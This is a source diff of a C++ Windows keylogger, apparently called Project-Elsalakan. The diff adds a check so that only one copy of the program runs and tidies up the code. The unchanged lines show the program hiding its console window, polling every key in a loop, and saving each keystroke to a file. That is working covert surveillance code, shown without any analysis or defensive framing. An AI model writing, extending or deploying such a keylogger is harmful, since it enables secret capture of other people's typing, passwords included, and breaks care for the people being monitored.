@@ -1,7 +1,9 @@
 #include <iostream>
 #include <fstream>
 #include <windows.h>
-
+#include <algorithm> 
+#include <string> 
+#include <tlhelp32.h> 
 
 using namespace std;
 
@@ -201,12 +203,55 @@ string SpecialKeys(int key) {
     return result;
 }
 
+bool IsOnlyOneProcessRunning(const char* processName) {
+    int count = 0;
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+    if (Process32First(snapshot, &entry) == TRUE) {
+        while (Process32Next(snapshot, &entry) == TRUE) {
+            if (strcmp(entry.szExeFile, processName) == 0) {
+                count++;
+                if (count > 1) {
+                    CloseHandle(snapshot);
+                    return false;
+                }
+            }
+        }
+    }
+
+    CloseHandle(snapshot);
+    return count == 1;
+}
+
 int main() {
-    int special_Key[] = { VK_MENU, VK_LAUNCH_APP2, VK_LAUNCH_APP1, VK_LAUNCH_MEDIA_SELECT, VK_LAUNCH_MAIL, VK_MEDIA_PLAY_PAUSE, VK_MEDIA_STOP, VK_MEDIA_PREV_TRACK, VK_MEDIA_NEXT_TRACK, VK_VOLUME_MUTE, VK_VOLUME_DOWN, VK_VOLUME_UP, VK_BROWSER_HOME, VK_BROWSER_FAVORITES, VK_BROWSER_SEARCH, VK_BROWSER_STOP, VK_BROWSER_REFRESH, VK_BROWSER_FORWARD, VK_BROWSER_BACK, VK_NUMLOCK, VK_SLEEP, VK_HELP, VK_EXECUTE, VK_SELECT, VK_DOWN, VK_RIGHT, VK_UP, VK_LEFT, VK_NEXT, VK_END, VK_DELETE, VK_PRIOR, VK_HOME, VK_INSERT, VK_PAUSE, VK_SCROLL, VK_SNAPSHOT, VK_APPS, VK_RWIN, VK_LWIN, VK_MENU, VK_CONTROL, VK_SHIFT, VK_ESCAPE, VK_CAPITAL, VK_TAB, VK_BACK, VK_RETURN, VK_SPACE, VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12 };
-    string specialK;
+    const char* processName = "Project-Elsalakan.exe";
+
+    if (!IsOnlyOneProcessRunning(processName)) {
+        return 0;
+    }
+
+    int special_Key[] = { VK_MENU, VK_LAUNCH_APP2, VK_LAUNCH_APP1,
+        VK_LAUNCH_MEDIA_SELECT, VK_LAUNCH_MAIL,
+        VK_MEDIA_PLAY_PAUSE, VK_MEDIA_STOP, VK_MEDIA_PREV_TRACK,
+        VK_MEDIA_NEXT_TRACK, VK_VOLUME_MUTE, VK_VOLUME_DOWN,
+        VK_VOLUME_UP, VK_BROWSER_HOME, VK_BROWSER_FAVORITES,
+        VK_BROWSER_SEARCH, VK_BROWSER_STOP, VK_BROWSER_REFRESH,
+        VK_BROWSER_FORWARD, VK_BROWSER_BACK, VK_NUMLOCK, VK_SLEEP,
+        VK_HELP, VK_EXECUTE, VK_SELECT, VK_DOWN, VK_RIGHT, VK_UP,
+        VK_LEFT, VK_NEXT, VK_END, VK_DELETE, VK_PRIOR, VK_HOME,
+        VK_INSERT, VK_PAUSE, VK_SCROLL, VK_SNAPSHOT, VK_APPS,
+        VK_RWIN, VK_LWIN, VK_MENU, VK_CONTROL, VK_SHIFT, VK_ESCAPE,
+        VK_CAPITAL, VK_TAB, VK_BACK, VK_RETURN, VK_SPACE, VK_F1, VK_F2,
+        VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11,
+        VK_F12 };
+    std::string specialK;
     bool isSpecial;
     HWND hwnd = GetConsoleWindow();
     ShowWindow(hwnd, SW_HIDE);
+
     while (true) {
         for (int i = 8; i <= 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
@@ -217,15 +262,15 @@ int main() {
                 }
                 else {
                     if (GetKeyState(VK_CAPITAL)) {
-                        SaveInFile(string(1, (char)i));
+                        SaveInFile(std::string(1, static_cast<char>(i)));
                     }
                     else {
-                        SaveInFile(string(1, (char)std::tolower(i)));
+                        SaveInFile(std::string(1, static_cast<char>(std::tolower(i))));
                     }
                 }
-
             }
         }
     }
+
     return 0;
 }
